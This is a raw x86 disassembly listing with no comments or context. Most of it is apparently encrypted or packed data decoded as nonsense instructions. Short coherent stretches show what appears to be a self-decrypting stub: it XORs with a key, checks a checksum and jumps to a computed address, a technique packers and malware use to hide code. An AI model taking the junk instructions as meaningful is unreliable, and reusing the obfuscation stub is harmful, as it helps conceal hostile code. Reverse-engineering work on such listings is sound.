  40c4df:	stc    
  40c4e0:	daa    
  40c4e1:	lods   al,BYTE PTR ds:[esi]
  40c4e2:	rcl    DWORD PTR [esi-0x78a080b2],1
  40c4e8:	push   esp
  40c4e9:	adc    DWORD PTR [ebp+0x71226acb],eax
  40c4ef:	push   ss
  40c4f0:	test   eax,0x166e9dc4
  40c4f5:	jecxz  0x40c504
  40c4f7:	adc    dh,0xf2
  40c4fa:	xchg   edi,eax
  40c4fb:	jmp    0x59b311ad
  40c500:	outs   dx,BYTE PTR ds:[esi]
  40c501:	jbe    0x40c508
  40c503:	jb     0x40c49f
  40c505:	adc    cl,BYTE PTR [edi]
  40c507:	lods   eax,DWORD PTR ds:[esi]
  40c508:	push   ds
  40c509:	jae    0x40c589
  40c50b:	xchg   DWORD PTR [ebx+0x28f122cb],edi
  40c511:	jnp    0x40c509
  40c513:	mov    ebp,0x29c9742b
  40c518:	lds    esi,FWORD PTR [eax-0x58]
  40c51b:	call   DWORD PTR [ecx-0xf]
  40c51e:	jns    0x40c4c8
  40c520:	push   0x54
  40c522:	ds xchg esi,eax
  40c524:	sub    DWORD PTR [edx+0x1d7eef2],edi
  40c52a:	mov    eax,ds:0xf60c0533
  40c52f:	adc    eax,0x1a5e0b06
  40c534:	inc    eax
  40c535:	call   0x1d2f:0x3569b41a
  40c53c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c53d:	cs ins BYTE PTR es:[edi],dx
  40c53f:	aas    
  40c540:	inc    edx
  40c541:	mov    dh,0x8d
  40c543:	mov    edi,0x6b7e1e49
  40c548:	xchg   edx,eax
  40c549:	(bad)  
  40c54a:	loope  0x40c551
  40c54c:	iret   
  40c54d:	repz and al,0x1e
  40c550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c551:	cs fdiv st,st(5)
  40c554:	sub    ecx,ecx
  40c556:	ror    BYTE PTR [ebp+0x7d018caa],1
  40c55c:	mov    bh,BYTE PTR [eax]
  40c55e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c560:	jmp    0xb715c8ad
  40c565:	mov    esi,0x11713b87
  40c56a:	jmp    0x40c5ca
  40c56c:	mov    al,0x72
  40c56e:	je     0x40c5a5
  40c570:	mov    ds:0x449ac0c,eax
  40c575:	xchg   edi,eax
  40c576:	(bad)  
  40c577:	cmc    
  40c578:	mov    bh,0x4b
  40c57a:	sub    al,0x4a
  40c57c:	dec    ebx
  40c57d:	ins    BYTE PTR es:[edi],dx
  40c57e:	inc    ecx
  40c57f:	or     edx,DWORD PTR [eax-0x55758b3b]
  40c585:	add    dl,BYTE PTR [edi-0x5f]
  40c588:	jmp    0xc9cc006e
  40c58d:	xor    ecx,DWORD PTR [eax+0xd]
  40c590:	jmp    0xe2fa:0x7ca0fc3b
  40c597:	nop
  40c598:	or     al,0x54
  40c59a:	(bad)  
  40c59c:	pop    edi
  40c59d:	sbb    BYTE PTR [edi-0x17],ah
  40c5a0:	(bad)  
  40c5a1:	xchg   ebx,eax
  40c5a2:	add    eax,0xa58901f2
  40c5a7:	into   
  40c5a8:	pusha  
  40c5a9:	repnz push ds
  40c5ab:	inc    ecx
  40c5ac:	icebp  
  40c5ad:	lea    ebp,[eax]
  40c5af:	and    BYTE PTR [edx-0x72],0x57
  40c5b3:	push   cs
  40c5b4:	fsub   QWORD PTR [ecx+0x5]
  40c5b7:	add    edi,DWORD PTR ss:[eax]
  40c5ba:	inc    ecx
  40c5bb:	ds jne 0x40c5d4
  40c5be:	arpl   cx,dx
  40c5c0:	lods   eax,DWORD PTR ds:[esi]
  40c5c1:	mov    ch,0xde
  40c5c3:	fcmovb st,st(4)
  40c5c5:	popa   
  40c5c6:	jne    0x40c5c8
  40c5c8:	call   0x2f61:0xada9f12f
  40c5cf:	imul   edx,DWORD PTR [ecx+ebx*2-0x2195102d],0xffffffc5
  40c5d7:	adc    BYTE PTR [eax],ch
  40c5d9:	push   esi
  40c5da:	lahf   
  40c5db:	(bad)  
  40c5dc:	(bad)  
  40c5dd:	ds push 0x4c6a835e
  40c5e3:	dec    edi
  40c5e4:	add    bh,BYTE PTR [eax-0xd9ef2bf]
  40c5ea:	sub    bl,dh
  40c5ec:	pop    es
  40c5ed:	test   al,0x4d
  40c5ef:	xor    esi,edx
  40c5f1:	das    
  40c5f2:	inc    ebx
  40c5f3:	push   ebx
  40c5f4:	aad    0x9f
  40c5f6:	aaa    
  40c5f7:	out    dx,eax
  40c5f8:	shr    BYTE PTR ss:[edi],cl
  40c5fb:	mov    bl,0x4
  40c5fd:	(bad)  
  40c5fe:	retf   
  40c5ff:	pop    edx
  40c600:	adc    ah,bh
  40c602:	cdq    
  40c603:	mov    eax,0xb4f36946
  40c608:	ja     0x40c670
  40c60a:	xlat   BYTE PTR ds:[ebx]
  40c60b:	and    dl,ch
  40c60d:	inc    esi
  40c60e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40c610:	xchg   dl,al
  40c612:	test   DWORD PTR [eax+0x30],ecx
  40c615:	pushf  
  40c616:	je     0x40c5a3
  40c618:	mov    esi,0x39e3eacf
  40c61d:	and    DWORD PTR [edi+esi*2-0x723d600],ecx
  40c624:	sbb    cl,dl
  40c626:	and    DWORD PTR [eax-0x6873a77],ebx
  40c62c:	(bad)  [ebx]
  40c62e:	sar    DWORD PTR [edi],0xc0
  40c631:	sub    al,0x9
  40c633:	push   0xffffff84
  40c635:	jge    0x40c64a
  40c637:	xchg   ebx,eax
  40c638:	(bad)  
  40c639:	das    
  40c63a:	jge    0x40c6b6
  40c63c:	out    dx,eax
  40c63d:	add    ah,BYTE PTR [ecx+0x667232d7]
  40c643:	(bad)  
  40c644:	fs rcr edx,cl
  40c647:	rcr    DWORD PTR [esi],1
  40c649:	test   eax,0x68da5bc0
  40c64e:	inc    ebp
  40c64f:	jnp    0x40c61e
  40c651:	xchg   edi,eax
  40c652:	push   ebx
  40c653:	adc    eax,0x9d1b9466
  40c658:	mov    WORD PTR [ebx-0x23c3d05b],?
  40c65e:	(bad)  
  40c65f:	mov    dl,0x63
  40c661:	sub    al,0x5d
  40c663:	adc    al,0x86
  40c665:	daa    
  40c666:	data16 ror BYTE PTR [edi],0xce
  40c66a:	loope  0x40c68e
  40c66c:	sub    ah,ah
  40c66e:	lods   eax,DWORD PTR ds:[esi]
  40c66f:	mov    dh,0x8f
  40c671:	dec    esp
  40c672:	jmp    0x40c641
  40c674:	cld    
  40c675:	test   eax,0xa2db0a6f
  40c67a:	pop    edi
  40c67b:	ja     0x40c65b
  40c67d:	mov    ds:0xc64e5c60,al
  40c682:	(bad)  
  40c683:	fisubr WORD PTR [eax]
  40c685:	fadd   DWORD PTR [ecx-0x27]
  40c688:	mov    eax,ds:0x7b4d9c68
  40c68d:	xchg   esi,eax
  40c68e:	xchg   esp,eax
  40c68f:	and    BYTE PTR [ebp+0x57f7d604],bl
  40c695:	cmp    dl,BYTE PTR [esi-0xf]
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x20a4653f],dl
  40c6de:	std    
  40c6df:	fiadd  WORD PTR [bx+si+0x7e7e]
  40c6e4:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c6e8:	fs push edi
  40c6ea:	stos   DWORD PTR es:[edi],eax
  40c6eb:	mov    esi,0x94c08f30
  40c6f0:	test   BYTE PTR [ebx+0x2f],dh
  40c6f3:	stc    
  40c6f4:	mov    edx,0xee32a534
  40c6f9:	cmp    edx,DWORD PTR [ebx+edi*4]
  40c6fc:	sar    DWORD PTR [ebx],cl
  40c6fe:	leave  
  40c6ff:	daa    
  40c700:	jae    0x40c6cb
  40c702:	(bad)  
  40c703:	mov    ecx,0x8518b6a7
  40c708:	retf   
  40c709:	daa    
  40c70a:	jns    0x40c6a4
  40c70c:	lock (bad) 
  40c70e:	jecxz  0x40c741
  40c710:	add    al,0x1d
  40c712:	pop    ds
  40c713:	lea    ebx,[ebx-0x19]
  40c716:	es stos BYTE PTR es:[edi],al
  40c718:	enter  0xe8b2,0xd8
  40c71c:	mov    es,WORD PTR [edx-0x65]
  40c71f:	ret    
  40c720:	push   ss
  40c721:	push   esp
  40c722:	jo     0x40c76c
  40c724:	mov    ah,0x48
  40c726:	push   0xffffff9a
  40c728:	mov    cl,ah
  40c72a:	lds    ebx,FWORD PTR [ecx]
  40c72c:	xor    ebx,ebp
  40c72e:	inc    esp
  40c72f:	add    ecx,eax
  40c731:	xor    ecx,eax
  40c733:	pushf  
  40c734:	inc    ebx
  40c735:	jnp    0x40c740
  40c737:	xchg   ebx,eax
  40c738:	ss pop ss
  40c73a:	pushf  
  40c73b:	add    eax,0xfed202ec
  40c740:	or     DWORD PTR [edi],eax
  40c742:	or     dl,BYTE PTR [edi]
  40c744:	sub    cl,dl
  40c746:	or     ebx,DWORD PTR [ebx]
  40c748:	mov    ecx,0x2af2b5b5
  40c74d:	repnz (bad) 
  40c74f:	and    DWORD PTR [ebx],esp
  40c751:	jmp    0x40c77a
  40c753:	push   esi
  40c754:	pop    ss
  40c755:	shl    DWORD PTR [edx],cl
  40c757:	push   0xffffffff
  40c759:	mov    WORD PTR [edx+eax*4],ss
  40c75c:	sbb    ebp,ecx
  40c75e:	sbb    ecx,DWORD PTR [edx-0x4]
  40c761:	pushf  
  40c762:	pop    ebp
  40c763:	aas    
  40c764:	sbb    ch,BYTE PTR [ebp-0x1883ae0]
  40c76a:	and    DWORD PTR [ebp+0x6fab6d0b],ecx
  40c770:	aas    
  40c771:	lods   eax,DWORD PTR ds:[esi]
  40c772:	push   cs
  40c773:	ror    DWORD PTR [edx],0x83
  40c776:	pop    es
  40c777:	sbb    esi,DWORD PTR [ebx]
  40c779:	aas    
  40c77a:	lahf   
  40c77b:	loope  0x40c70a
  40c77d:	or     esp,DWORD PTR [eax+eiz*1-0x3f29cd7a]
  40c784:	or     BYTE PTR [ecx],0x93
  40c787:	(bad)  [ecx+0x4afaca96]
  40c78d:	push   cs
  40c78e:	xlat   BYTE PTR ds:[ebx]
  40c78f:	aad    0xac
  40c791:	in     al,0xcc
  40c793:	push   esp
  40c794:	retf   
  40c795:	mov    edi,0xbc4ddb37
  40c79a:	pop    esi
  40c79b:	sbb    dl,BYTE PTR [edx]
  40c79d:	pop    edi
  40c79e:	iret   
  40c79f:	call   0xdaff:0xc87cde0e
  40c7a6:	jae    0x40c75b
  40c7a8:	or     BYTE PTR [eax-0x46],bl
  40c7ab:	push   eax
  40c7ac:	mov    esp,0x8bd2b1e1
  40c7b1:	and    cl,BYTE PTR [ebp+0x13]
  40c7b4:	ja     0x40c7c6
  40c7b6:	push   es
  40c7b7:	das    
  40c7b8:	xchg   edi,eax
  40c7b9:	add    ah,dh
  40c7bb:	icebp  
  40c7bc:	stc    
  40c7bd:	and    eax,0xa01523fa
  40c7c2:	stos   BYTE PTR es:[edi],al
  40c7c3:	inc    ecx
  40c7c4:	mov    esp,0x5f50d897
  40c7c9:	inc    esp
  40c7ca:	jns    0x40c74c
  40c7cc:	pop    edx
  40c7cd:	jns    0x40c766
  40c7cf:	mov    ebx,0x3ece0c0f
  40c7d4:	xor    eax,0xeb6d34b1
  40c7d9:	popf   
  40c7da:	lock es std 
  40c7dd:	mov    dl,0xfa
  40c7df:	pop    edi
  40c7e0:	add    DWORD PTR [esi],edi
  40c7e2:	mov    edx,0xf3cad5d1
  40c7e7:	push   ebp
  40c7e8:	mov    ebx,DWORD PTR [esi]
  40c7ea:	push   ecx
  40c7eb:	leave  
  40c7ec:	xor    ebp,DWORD PTR [esi+0x61]
  40c7ef:	xlat   BYTE PTR ds:[ebx]
  40c7f0:	and    esi,DWORD PTR [ecx-0x2c]
  40c7f3:	aas    
  40c7f4:	ret    0x405d
  40c7f7:	push   edx
  40c7f8:	mov    edx,0x38096664
  40c7fd:	gs js  0x40c851
  40c800:	mov    ?,WORD PTR [ebx-0x35]
  40c803:	and    eax,0x45448c97
  40c808:	cmp    ah,BYTE PTR [edx]
  40c80a:	inc    esp
  40c80b:	(bad)  
  40c80c:	mov    ds:0xf092a104,eax
  40c811:	cli    
  40c812:	stc    
  40c813:	sub    dl,BYTE PTR [ecx+0x49]
  40c816:	dec    ebx
  40c817:	out    0xe3,eax
  40c819:	sub    eax,0x50
  40c81c:	add    ch,BYTE PTR [edi+0x2d93c071]
  40c822:	je     0x40c7f4
  40c824:	sbb    eax,0x8d6a7106
  40c829:	and    dh,BYTE PTR [ebx+0x7174c26c]
  40c82f:	xor    DWORD PTR cs:[ebp-0x27812b68],0xffffffe5
  40c837:	sub    dh,ah
  40c839:	cmp    eax,0xb258fd8e
  40c83e:	and    esi,ebx
  40c840:	retf   0x47f6
  40c843:	retf   0xdce1
  40c846:	and    eax,0x7bbbc9d2
  40c84b:	out    0x9,eax
  40c84d:	out    0x94,eax
  40c84f:	xor    BYTE PTR [eax],al
  40c851:	arpl   WORD PTR ds:0xe880338f,ax
  40c857:	jge    0x40c808
  40c859:	stos   DWORD PTR es:[edi],eax
  40c85a:	jno    0x40c8b2
  40c85c:	add    al,BYTE PTR [ebp+0x71]
  40c85f:	ins    DWORD PTR es:[edi],dx
  40c860:	outs   dx,DWORD PTR ds:[esi]
  40c861:	fmul   QWORD PTR [edi]
  40c863:	mov    cl,0xcb
  40c865:	ja     0x40c82b
  40c867:	iret   
  40c868:	(bad)  
  40c869:	jp     0x40c7f1
  40c86b:	cmp    BYTE PTR [eax+ebp*2-0x6c501df4],ah
  40c872:	lds    ecx,FWORD PTR [ecx+0x49f7d617]
  40c878:	ins    BYTE PTR es:[edi],dx
  40c879:	and    al,0x43
  40c87b:	push   es
  40c87c:	cmp    ecx,DWORD PTR [ebp-0x55]
  40c87f:	test   DWORD PTR ds:0x11611ee8,esp
  40c885:	xor    BYTE PTR [eax-0x72],dh
  40c888:	jnp    0x40c878
  40c88a:	jns    0x40c8ef
  40c88c:	dec    ebx
  40c88d:	cmp    al,0x3a
  40c88f:	sbb    al,0x8e
  40c891:	or     ch,ch
  40c893:	pop    ebp
  40c894:	push   ss
  40c895:	xchg   ebp,eax
  40c896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c897:	out    0xe7,al
  40c899:	mov    edi,0xfe86aa83
  40c89e:	sub    eax,0xb57fb80
  40c8a3:	add    al,0x15
  40c8a5:	xchg   esi,eax
  40c8a6:	sbb    BYTE PTR [esi+ecx*4+0x3d],cl
  40c8aa:	adc    ebp,DWORD PTR [ecx+ecx*4+0x79]
  40c8ae:	push   ds
  40c8af:	inc    edx
  40c8b0:	fs dec ecx
  40c8b2:	xchg   BYTE PTR [eax],cl
  40c8b4:	pop    ss
  40c8b5:	xchg   esp,eax
  40c8b6:	cld    
  40c8b7:	data16 ds repz int3 
  40c8bb:	mov    ah,0x66
  40c8bd:	rcr    BYTE PTR [ecx+0x67aa7f01],cl
  40c8c3:	repnz and eax,0x99d28699
  40c8c9:	adc    cl,BYTE PTR [eax-0x2bd8dd]
  40c8cf:	push   ecx
  40c8d0:	or     BYTE PTR [eax+ebp*8+0x12],dl
  40c8d4:	iret   
  40c8d5:	imul   ecx,DWORD PTR [ecx+0x14],0xa77435d4
  40c8dc:	sbb    eax,DWORD PTR [ebx+0x55]
  40c8df:	mov    gs,WORD PTR [esi]
  40c8e1:	inc    esi
  40c8e2:	jo     0x40c951
  40c8e4:	ret    0xd7f2
  40c8e7:	push   ebp
  40c8e8:	jle    0x40c8cf
  40c8ea:	addr16 inc ecx
  40c8ec:	dec    esi
  40c8ed:	fld    DWORD PTR [edx+0xc02214b]
  40c8f3:	clc    
  40c8f4:	jmp    0x92d2:0x43c12ce
  40c8fb:	ret    
  40c8fc:	or     ecx,esp
  40c8fe:	inc    esi
  40c8ff:	test   DWORD PTR [edx+esi*1],edx
  40c902:	adc    DWORD PTR [ebp-0x48da751d],eax
  40c908:	mov    eax,0x7b751ea0
  40c90d:	inc    esp
  40c90e:	push   eax
  40c90f:	xchg   ebp,eax
  40c910:	clc    
  40c911:	into   
  40c912:	rcr    BYTE PTR [esi],cl
  40c914:	mov    WORD PTR [edx+0x7e4f3640],gs
  40c91a:	xchg   DWORD PTR [edi-0x5adcb6c9],edi
  40c920:	fcos   
  40c922:	lock add al,0x7f
  40c925:	pop    esi
  40c926:	inc    eax
  40c927:	jnp    0x40c956
  40c929:	ins    DWORD PTR es:[edi],dx
  40c92a:	iret   
  40c92b:	mov    ds:0x558bec6a,al
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    edi,ebx
  40c945:	add    eax,0x8e989f9b
  40c94a:	jle    0x40c9ca
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	popa   
  40c951:	sub    esp,DWORD PTR [ebp-0x3e]
  40c954:	push   ebx
  40c955:	add    eax,0xe0a8212e
  40c95a:	ret    
  40c95b:	xor    al,0xb7
  40c95d:	call   0x5666aeb4
  40c962:	fwait
  40c963:	add    eax,0xc987cf06
  40c968:	stos   BYTE PTR es:[edi],al
  40c969:	mov    eax,0x6c463ec6
  40c96e:	dec    edi
  40c96f:	pop    esi
  40c970:	int    0x55
  40c972:	lock mov eax,esi
  40c975:	in     al,dx
  40c976:	aaa    
  40c977:	cmp    edi,edi
  40c979:	pop    edx
  40c97a:	(bad)  
  40c97b:	fistp  DWORD PTR [edx+0x29]
  40c97e:	lgs    edi,FWORD PTR [ebp+0x6b]
  40c982:	jle    0x40c907
  40c984:	jnp    0x40c9ed
  40c986:	sbb    DWORD PTR [ecx-0x44],0xaf1f4b45
  40c98d:	push   ds
  40c98e:	fnstsw WORD PTR [eax-0x25]
  40c991:	jb     0x40c9aa
  40c993:	repz cli 
  40c995:	in     al,dx
  40c996:	push   ecx
  40c997:	push   ss
  40c998:	out    0x6a,al
  40c99a:	in     eax,dx
  40c99b:	scas   al,BYTE PTR es:[edi]
  40c99c:	mov    bh,bh
  40c99e:	cmp    eax,0x61137af4
  40c9a3:	jb     0x40c988
  40c9a5:	iret   
  40c9a6:	fcomp  QWORD PTR [ecx-0x6a]
  40c9a9:	jbe    0x40c9fe
  40c9ab:	dec    edi
  40c9ac:	cs mov esi,0xed763ef5
  40c9b2:	mov    edi,0xdaad0d92
  40c9b7:	ret    
  40c9b8:	mov    dh,BYTE PTR [edi+ecx*4+0x7e]
  40c9bc:	test   eax,0x3d776a30
  40c9c1:	lea    ebx,[edx-0x3a60ca53]
  40c9c7:	sbb    BYTE PTR [esi-0x1f],ch
  40c9ca:	shl    ecx,cl
  40c9cc:	mov    WORD PTR [edx-0x7e4d1536],es
  40c9d2:	jbe    0x40c9d3
  40c9d4:	mov    eax,0xf1d68842
  40c9d9:	cmp    DWORD PTR [ebp-0x2d],esi
  40c9dc:	clc    
  40c9dd:	inc    esi
  40c9de:	or     esp,DWORD PTR [eax+0x1f]
  40c9e1:	xchg   esp,edx
  40c9e3:	xor    BYTE PTR [ebp-0x7d86e2ab],dl
  40c9e9:	loope  0x40ca4f
  40c9eb:	mov    ah,0x8a
  40c9ed:	fst    QWORD PTR [bp-0x2e3c]
  40c9f2:	mov    fs:0x1b9c1fca,eax
  40c9f8:	out    dx,eax
  40c9f9:	lahf   
  40c9fa:	arpl   WORD PTR [edx+eax*2-0x1d62f257],sp
  40ca01:	or     DWORD PTR [eax+0x5f],esp
  40ca04:	jge    0x40c9f9
  40ca06:	push   edx
  40ca07:	ret    0xc742
  40ca0a:	sub    al,BYTE PTR [esi+edi*2-0x4f]
  40ca0e:	push   edi
  40ca0f:	sti    
  40ca10:	(bad)  
  40ca11:	jmp    0xbbab:0xde97676f
  40ca18:	push   0x7c
  40ca1a:	and    eax,0x62c0210a
  40ca1f:	inc    ebp
  40ca20:	xor    al,0xb4
  40ca22:	mov    al,ds:0xea6685b8
  40ca27:	add    ebx,0xffffffca
  40ca2a:	(bad)  
  40ca2b:	int    0x72
  40ca2d:	adc    DWORD PTR [esi-0x674932a5],esi
  40ca33:	les    ecx,FWORD PTR [ebx-0x6d]
  40ca36:	jg     0x40ca1e
  40ca38:	jmp    0xdbeec355
  40ca3d:	push   0xa444780b
  40ca42:	pop    eax
  40ca43:	into   
  40ca44:	mov    ds:0x635044c3,eax
  40ca49:	out    dx,eax
  40ca4a:	lock aad 0x10
  40ca4d:	daa    
  40ca4e:	test   DWORD PTR [edi+eiz*8+0x248ac241],eax
  40ca55:	mov    dl,BYTE PTR [ebp+0x28]
  40ca58:	imul   ebx,DWORD PTR [ecx-0x51],0x43008de4
  40ca5f:	sub    BYTE PTR [esi-0x8],0x74
  40ca63:	pop    ebp
  40ca64:	sbb    eax,0xc78597d9
  40ca69:	push   eax
  40ca6a:	fs sahf 
  40ca6c:	xor    al,0x81
  40ca6e:	pop    ebp
  40ca6f:	out    dx,eax
  40ca70:	cli    
  40ca71:	sub    al,0x27
  40ca73:	adc    BYTE PTR [esi-0x62d25cce],cl
  40ca79:	not    edx
  40ca7b:	fst    DWORD PTR [ebx+0x70]
  40ca7e:	loop   0x40ca15
  40ca80:	mov    bl,0xcd
  40ca82:	hlt    
  40ca83:	in     eax,dx
  40ca84:	stos   DWORD PTR es:[edi],eax
  40ca85:	aaa    
  40ca86:	stos   BYTE PTR es:[edi],al
  40ca87:	xchg   ebx,esp
  40ca89:	or     edx,DWORD PTR [edi+0x29]
  40ca8c:	fadd   QWORD PTR [ecx-0xd]
  40ca8f:	push   edx
  40ca90:	scas   al,BYTE PTR es:[edi]
  40ca91:	outs   dx,DWORD PTR ds:[esi]
  40ca92:	add    DWORD PTR [esi],eax
  40ca94:	add    edi,DWORD PTR ds:0xe45af0a0
  40ca9a:	fisub  WORD PTR [edi+0x5]
  40ca9d:	jmp    0x40ca3c
  40ca9f:	and    DWORD PTR [edi],esp
  40caa1:	cmp    al,0xc
  40caa3:	lds    ebp,FWORD PTR [edi-0x5a]
  40caa6:	inc    esi
  40caa7:	loop   0x40ca85
  40caa9:	das    
  40caaa:	(bad)  
  40caab:	and    eax,0xfa42902f
  40cab0:	push   ds
  40cab1:	dec    eax
  40cab2:	ret    
  40cab3:	sub    eax,0x27d6a144
  40cab8:	lds    ebx,FWORD PTR ds:0x47ae304a
  40cabe:	mov    ecx,0xd1d99de2
  40cac3:	std    
  40cac4:	ret    
  40cac5:	lock jns 0x40cb29
  40cac8:	retf   0x145d
  40cacb:	aad    0x69
  40cacd:	and    BYTE PTR [eax+0x7e],cl
  40cad0:	data16 out dx,al
  40cad2:	imul   esi,DWORD PTR [ebx+0x45ece0c0],0x22
  40cad9:	xchg   esi,eax
  40cada:	ins    BYTE PTR es:[edi],dx
  40cadb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cadc:	sahf   
  40cadd:	ins    DWORD PTR es:[edi],dx
  40cade:	aaa    
  40cadf:	in     al,dx
  40cae0:	push   esp
  40cae1:	test   eax,0x8fb569f0
  40cae6:	call   0xfb5d:0xd2c73ff2
  40caed:	fidiv  DWORD PTR [edx]
  40caef:	mov    bh,0xc9
  40caf1:	add    BYTE PTR [esi+0x2c],cl
  40caf4:	shl    BYTE PTR [edx-0x1ad94042],cl
  40cafa:	mov    ah,0x26
  40cafc:	push   esp
  40cafd:	stc    
  40cafe:	xor    DWORD PTR [esi+0x5cc26f63],esi
  40cb04:	xchg   edi,eax
  40cb05:	cld    
  40cb06:	and    BYTE PTR [ebp+0x2b65ca51],al
  40cb0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb0d:	fisttp DWORD PTR [edx]
  40cb0f:	js     0x40cb57
  40cb11:	dec    ebp
  40cb12:	rol    ch,cl
  40cb14:	cmp    BYTE PTR [esi-0x5],dh
  40cb17:	inc    edx
  40cb18:	xor    eax,0xbf637b0b
  40cb1e:	xchg   esi,eax
  40cb1f:	xor    DWORD PTR [ebp+0x5eea239],0x54
  40cb26:	jl     0x40cb03
  40cb28:	jae    0x40cb71
  40cb2a:	ja     0x40cb9e
  40cb2c:	xor    BYTE PTR [edi-0x417e7711],0xfd
  40cb33:	popf   
  40cb34:	inc    edx
  40cb35:	pop    esi
  40cb36:	sbb    BYTE PTR [edx-0x51],ah
  40cb39:	enter  0x3b19,0xea
  40cb3d:	adc    ah,ah
  40cb3f:	or     bl,dl
  40cb41:	dec    eax
  40cb42:	push   ecx
  40cb43:	mov    BYTE PTR [eax],bh
  40cb45:	cdq    
  40cb46:	adc    bh,BYTE PTR [ebp+0x21]
  40cb49:	lock jno 0x40cb99
  40cb4c:	jl     0x40cad5
  40cb4e:	dec    ebp
  40cb4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb50:	pop    edx
  40cb51:	mov    ebx,eax
  40cb53:	push   0x251788dc
  40cb58:	lea    ecx,[edi-0x1e]
  40cb5b:	gs shl edx,1
  40cb5e:	ins    DWORD PTR es:[edi],dx
  40cb5f:	pop    ebx
  40cb61:	jl     0x40cb43
  40cb63:	loopne 0x40cb1a
  40cb65:	push   edi
  40cb66:	push   ss
  40cb67:	fisttp WORD PTR [ebx-0x2a7e9c88]
  40cb6d:	mov    esi,0x7fd1131
  40cb72:	dec    ebx
  40cb73:	shr    BYTE PTR [esi],cl
  40cb75:	ds inc ebp
  40cb77:	into   
  40cb78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb79:	sub    eax,0xd870645b
  40cb7e:	call   0x64bd7687
  40cb83:	inc    edx
  40cb84:	inc    ebp
  40cb85:	push   ecx
  40cb86:	and    esp,edi
  40cb88:	ret    
  40cb89:	xchg   ecx,eax
  40cb8a:	inc    ebx
  40cb8b:	jb     0x40cb66
  40cb8d:	dec    ecx
  40cb8e:	add    dl,BYTE PTR [ebp-0x5d]
  40cb91:	sqrtps xmm3,XMMWORD PTR [esi+0x8]
  40cb95:	dec    eax
  40cb96:	add    eax,esi
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x1c]
  40cbfc:	jae    0x40cc54
  40cbfe:	std    
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cc1f
  40cc08:	popa   
  40cc09:	shl    DWORD PTR [ecx-0xf1c653e],1
  40cc0f:	push   0x19b48a4e
  40cc14:	ds in  al,dx
  40cc16:	push   edx
  40cc17:	mov    dl,0xbd
  40cc19:	dec    ecx
  40cc1a:	adc    al,BYTE PTR [ecx]
  40cc1c:	neg    DWORD PTR [edi-0x42b81b94]
  40cc22:	outs   dx,DWORD PTR ds:[esi]
  40cc23:	adc    BYTE PTR [edx-0x66d39df],dl
  40cc29:	push   ebx
  40cc2a:	mov    edx,0x44a07f7a
  40cc2f:	adc    DWORD PTR [ebx-0x34],0x42
  40cc33:	adc    BYTE PTR [ebp+ebp*1-0x135a6aa4],bl
  40cc3a:	loop   0x40cc83
  40cc3c:	xchg   edx,ebp
  40cc3e:	test   eax,0x109d26b8
  40cc43:	out    0x63,eax
  40cc45:	ins    BYTE PTR es:[edi],dx
  40cc46:	cmp    BYTE PTR ds:0xa8e5310f,cl
  40cc4c:	sar    al,0xf7
  40cc4f:	lds    ebp,FWORD PTR [ecx-0x6ddd9b57]
  40cc55:	aam    0x8
  40cc57:	xor    BYTE PTR [edi-0x541ba56a],0xa3
  40cc5e:	mov    al,0x57
  40cc60:	or     DWORD PTR [ebp+0x44f5f1a4],ecx
